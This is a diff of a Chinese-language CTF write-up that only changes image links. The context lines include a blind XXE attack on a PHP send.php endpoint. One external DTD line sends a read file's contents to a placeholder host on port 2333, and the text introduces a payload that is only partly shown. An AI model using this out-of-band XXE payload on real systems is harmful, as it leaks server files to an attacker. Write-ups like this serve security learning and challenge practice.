@@ -1,12 +1,12 @@
-![[Pasted image 20230205110445.png|500]]
+![](<./img/Pasted image 20230205110445.png>)
 
-![[Pasted image 20230205110501.png|500]]
+![](<./img/Pasted image 20230205110501.png>)
 
-![[Pasted image 20230205110522.png|300]]
+![](<./img/Pasted image 20230205110522.png>)
 
 提示可以下载源码
 
-![[Pasted image 20230205110551.png|200]]
+![](<./img/Pasted image 20230205110551.png>)
 
 `send.php`
 
@@ -68,7 +68,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://xxx.xxx.xxx.xxx:2333?p=%file;'>">
 ```
 
-![[Pasted image 20230205111620.png|700]]
+![](<./img/Pasted image 20230205111620.png>)
 
 payload如下
 
@@ -79,8 +79,8 @@ payload如下
 ]>
 ```
 
-![[Pasted image 20230205112753.png|700]]
+![](<./img/Pasted image 20230205112753.png>)
 
-![[Pasted image 20230205112853.png|700]]
+![](<./img/Pasted image 20230205112853.png>)
 
 #Web #PHP #源码泄漏 #XXE #盲注 #DTD #伪协议 
